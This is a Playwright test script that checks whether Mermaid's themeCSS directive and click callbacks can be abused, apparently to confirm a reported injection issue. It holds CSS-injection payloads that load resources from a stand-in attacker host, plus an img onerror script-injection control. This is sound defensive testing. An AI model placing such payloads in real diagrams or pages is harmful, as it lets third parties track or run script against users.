// Skeptic check: does Mermaid 12.3.0 apply themeCSS from a %%{init}%% directive? The builder's probe looked
// for "#ff0000" and "attacker"; CSSOM serializes colours as rgb(), and Mermaid turns ' into " inside a
// directive, which breaks the JSON of H03. Also: a positive control that script in the render page is seen.
//   node verify/themecss.mjs
import { readFileSync } from 'node:fs'
import { createRequire } from 'node:module'
const require = createRequire(new URL('../package.json', import.meta.url))
const { chromium } = require('playwright-core')
const mermaidJs = readFileSync(new URL('../node_modules/mermaid/dist/mermaid.min.js', import.meta.url), 'utf8')
const LOCKED = ['secure', 'securityLevel', 'startOnLoad', 'maxTextSize', 'suppressErrorRendering', 'maxEdges', 'htmlLabels', 'themeCSS', 'themeVariables', 'fontFamily', 'altFontFamily', 'darkMode', 'look', 'layout']
const H03 = `%%{init: {"themeCSS": ".node rect { fill: url(https://attacker.example/h03.png) } @import url('https://attacker.example/h03.css');"}}%%\nflowchart LR\n    A[Узел] --> B[Узел 2]`
const cases = {
  'red (builder H03-noUrl)': '%%{init: {"themeCSS": ".node rect { fill: #ff0000 !important }"}}%%\nflowchart LR\n    A[Узел] --> B[Узел 2]',
  'H03 as in corpus': H03,
  'H03 without single quotes': H03.replace("url('https://attacker.example/h03.css')", 'url(https://attacker.example/h03.css)'),
}
const browser = await chromium.launch()
const hits = [], requests = []
const context = await browser.newContext()
await context.route('**/*', (r) => {
  const u = r.request().url()
  if (u === 'https://render.invalid/') return r.fulfill({ contentType: 'text/html', body: '<!doctype html><meta charset="utf-8"><script src="/m.js"></script><body></body>' })
  if (u === 'https://render.invalid/m.js') return r.fulfill({ contentType: 'text/javascript', body: mermaidJs })
  requests.push(u); r.abort().catch(() => {})
})
const page = await context.newPage()
await page.exposeFunction('__hit', (t) => hits.push(t))
await page.goto('https://render.invalid/')
for (const [name, src] of Object.entries(cases)) {
  for (const mode of ['default', 'locked']) {
    const r = await page.evaluate(async ({ src, secure }) => {
      const cfg = { startOnLoad: false, securityLevel: 'strict', suppressErrorRendering: true, htmlLabels: false }
      if (secure) cfg.secure = secure
      window.mermaid.initialize(cfg)
      try { const { svg } = await window.mermaid.render('t' + Math.random().toString(36).slice(2), src); return { svg } } catch (e) { return { error: String(e.message || e).slice(0, 120) } }
    }, { src, secure: mode === 'locked' ? LOCKED : null })
    const s = r.svg || ''
    console.log(name.padEnd(28), mode.padEnd(8), r.error ? 'ERR ' + r.error : '', '#ff0000:', s.includes('#ff0000'), 'rgb(255, 0, 0):', s.includes('rgb(255, 0, 0)'), 'attacker:', s.includes('attacker.example'))
  }
}
// Positive controls in the render page itself.
await page.evaluate(() => { const d = document.createElement('div'); d.innerHTML = '<img src="x" onerror="__hit(\'CTL3 handler in render page\')">'; document.body.appendChild(d) })
const loose = await page.evaluate(async () => {
  window.mermaid.initialize({ startOnLoad: false, securityLevel: 'loose', htmlLabels: false })
  const { svg, bindFunctions } = await window.mermaid.render('ctl4', 'flowchart LR\n  A[Нажми] --> B\n  click A call __hit("CTL4 loose click callback")')
  const host = document.createElement('div'); host.innerHTML = svg; document.body.appendChild(host); bindFunctions?.(host)
  const node = host.querySelector('g.node'); node?.dispatchEvent(new MouseEvent('click', { bubbles: true }))
  return !!node
})
const strict = await page.evaluate(async () => {
  window.mermaid.initialize({ startOnLoad: false, securityLevel: 'strict', htmlLabels: false })
  const { svg, bindFunctions } = await window.mermaid.render('ctl5', 'flowchart LR\n  A[Нажми] --> B\n  click A call __hit("CTL5 strict click callback")')
  const host = document.createElement('div'); host.innerHTML = svg; document.body.appendChild(host); bindFunctions?.(host)
  const node = host.querySelector('g.node'); node?.dispatchEvent(new MouseEvent('click', { bubbles: true }))
  return !!node
})
await page.waitForTimeout(500)
console.log('controls: loose node', loose, 'strict node', strict, 'hits', JSON.stringify(hits))
console.log('requests during the whole run:', JSON.stringify([...new Set(requests)]))
await browser.close()
